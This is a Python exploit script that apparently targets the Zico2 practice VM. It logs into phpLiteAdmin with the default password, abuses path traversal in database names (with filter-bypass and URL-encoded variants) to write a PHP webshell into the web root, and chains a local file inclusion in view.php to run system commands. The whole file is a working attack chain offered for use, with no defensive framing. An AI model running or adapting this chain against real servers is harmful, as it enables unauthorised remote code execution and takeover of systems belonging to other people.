#!/usr/bin/env python3
"""zico2 RCE - Final exploit using phpLiteAdmin path traversal"""
import requests
import re
import time

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
print('[1] Login phpLiteAdmin...')
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# phpLiteAdmin stores DBs in /usr/databases/
# Web root is /var/www/
# Path from /usr/databases/ to /var/www/: ../../var/www/
# So DB name should be: ../../var/www/s.php

# But we need to check if phpliteadmin sanitizes the name
# Let's try different variants
print('[2] Creating webshell via path traversal in DB name...')
payloads = [
    '../../var/www/s.php',        # standard traversal
    '../var/www/s.php',           # might work if /usr/databases/ is symlink
    '....//....//....//var//www//s.php',  # filter bypass
    '..../..../var/www/s.php',    # extra dots
    '%2e%2e%2f%2e%2e%2fvar%2fwww%2fs.php',  # URL encoded
]

for name in payloads:
    # Re-login for each attempt
    s.cookies.clear()
    s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})
    
    r = s.post(PHPLITE, data={'new_dbname': name}, timeout=15)
    print(f'  DB name="{name}" -> {r.status_code} ({len(r.text)}B)')
    
    # Check if there's an error
    if 'exists' in r.text.lower() or 'error' in r.text.lower()[:200]:
        err = re.search(r'(error|exists|could not|unable)[^<]*', r.text, re.I)
        if err:
            print(f'    Error: {err.group(0).strip()[:100]}')
    
    # Wait a moment for file system
    time.sleep(0.5)
    
    # Try to access the file
    r2 = s.get(f'{BASE}/s.php?c=id', timeout=10)
    print(f'  Access /s.php: {r2.status_code} ({len(r2.text)}B)')
    if 'uid=' in r2.text or r2.status_code == 200 and len(r2.text) > 50:
        clean = re.sub(r'<[^>]+>', '', r2.text).strip()
        print(f'  [+] WEBHELL DEPLOYED! Output: {clean[:300]}')
        
        # If it's a SQLite file, the header will be there but PHP should still execute
        # the PHP code embedded in the data
        print(f'  [+] Try LFI include: /view.php?page=s.php&c=id')
        r3 = s.get(f'{BASE}/view.php?page=s.php&c=id', timeout=10)
        clean3 = re.sub(r'<[^>]+>', '', r3.text).strip()
        if 'uid=' in clean3:
            print(f'  [+] RCE VIA LFI: {clean3[:200]}')
        break

# Alternative: Create database then switch to it and insert payload
print('\n[3] Alternative: Create DB first, then insert PHP payload...')
s.cookies.clear()
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Create the webshell DB
r = s.post(PHPLITE, data={'new_dbname': '../../var/www/s.php'}, timeout=15)
print(f'  Create: {r.status_code}')

# Switch to it
r2 = s.get(f'{PHPLITE}?switchdb=..%2F..%2Fvar%2Fwww%2Fs.php', timeout=15)
print(f'  Switch: {r2.status_code} ({len(r2.text)}B)')

# Create table
r3 = s.post(f'{PHPLITE}?switchdb=..%2F..%2Fvar%2Fwww%2Fs.php&action=table_create', data={
    'tablename': 'cmd',
    'tablefields': '1',
    'f0name': 'payload',
    'f0type': 'TEXT',
    'createtable': 'Go',
}, timeout=15)
print(f'  Create table: {r3.status_code}')

# Insert PHP code
r4 = s.post(f'{PHPLITE}?switchdb=..%2F..%2Fvar%2Fwww%2Fs.php&action=row_create', data={
    'val0': '<?php system($_GET["c"]); ?>',
    'null_val0': 'NULL',
}, timeout=15)
print(f'  Insert payload: {r4.status_code}')

# Test direct access
r5 = s.get(f'{BASE}/s.php', timeout=10)
print(f'  Direct access /s.php: {r5.status_code} ({len(r5.text)}B)')

# The problem is SQLite adds a header, so PHP won't execute it as code
# We need to use the LFI to include it
r6 = s.get(f'{BASE}/view.php?page=../../var/www/s.php&c=id', timeout=10)
print(f'  LFI include: {r6.status_code} ({len(r6.text)}B)')
clean6 = re.sub(r'<[^>]+>', '', r6.text).strip()
print(f'  LFI output: {clean6[:200]}')

# Check if cmd executed
r7 = s.get(f'{BASE}/view.php?page=../../var/www/s.php', params={'c': 'id'}, timeout=10)
clean7 = re.sub(r'<[^>]+>', '', r7.text).strip()
if 'uid=' in clean7:
    print(f'  [+] FINAL RCE SUCCESS: {clean7[:200]}')
else:
    print(f'  [-] No RCE yet. Output: {clean7[:200]}')
